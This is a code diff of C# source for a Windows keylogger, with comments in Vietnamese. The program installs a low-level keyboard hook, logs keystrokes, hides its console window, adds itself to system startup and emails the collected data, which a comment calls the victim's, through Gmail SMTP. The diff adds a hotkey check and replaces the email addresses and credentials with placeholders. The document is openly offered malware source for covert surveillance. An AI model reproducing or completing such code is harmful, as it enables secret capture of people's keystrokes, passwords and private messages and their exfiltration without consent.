@@ -94,6 +94,7 @@ namespace Windows_Application
             {
                 int vkCode = Marshal.ReadInt32(lParam);  // Xuất code của phím ng dùng nhấn
 
+                CheckHotKey(vkCode);                     // Đọc key 
                 WriteLog(vkCode);                        // Ghi log ra
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam); // Thực hiện lại phương thức handle để nhận biết keys
@@ -126,7 +127,7 @@ namespace Windows_Application
         static bool isHotKey = false; // Phím tắt ...
         static bool isShowing = false; // Hiển thị cmd
         static Keys previoursKey = Keys.Separator; // 
-        
+
         static void CheckHotKey(int vkCode)
         {
             if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.L)
@@ -260,7 +261,7 @@ namespace Windows_Application
                 SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com"); // Client dùng để gửi mail 
 
                 mail.From = new MailAddress("email@gmail.com");
-                mail.To.Add("emailcuaban@gmail.com"); //Mail mà thông tin của victim được gửi về 
+                mail.To.Add("email@gmail.com"); //Mail mà thông tin của victim được gửi về 
                 mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
                 mail.Body = "Nội dung của victim\n" + "\n";
 
@@ -285,8 +286,9 @@ namespace Windows_Application
                 }
 
                 SmtpServer.Port = 587;
-                SmtpServer.Credentials = new System.Net.NetworkCredential("maildungdegui@gmail.com", "password");// Tài khoản và mật khẩu của mình để gửi mail
+                SmtpServer.Credentials = new System.Net.NetworkCredential("email@gmail.com", "password");// Tài khoản và mật khẩu của mình để gửi mail
                 SmtpServer.EnableSsl = true;
+
 
                 SmtpServer.Send(mail);
                 Console.WriteLine("Send mail!");
@@ -323,9 +325,11 @@ namespace Windows_Application
 
         static void Main(string[] args)
         {
+            int vkCode = 0;
+
             StartWithOS(); //Chạy khi khởi động
             HideWindow(); //Ẩn terminal
-
+            CheckHotKey(vkCode);
             StartTimmer(); //Thời gian chụp ảnh, gửi mail,...
             HookKeyboard();// Nhận diện phím được bấm
         }
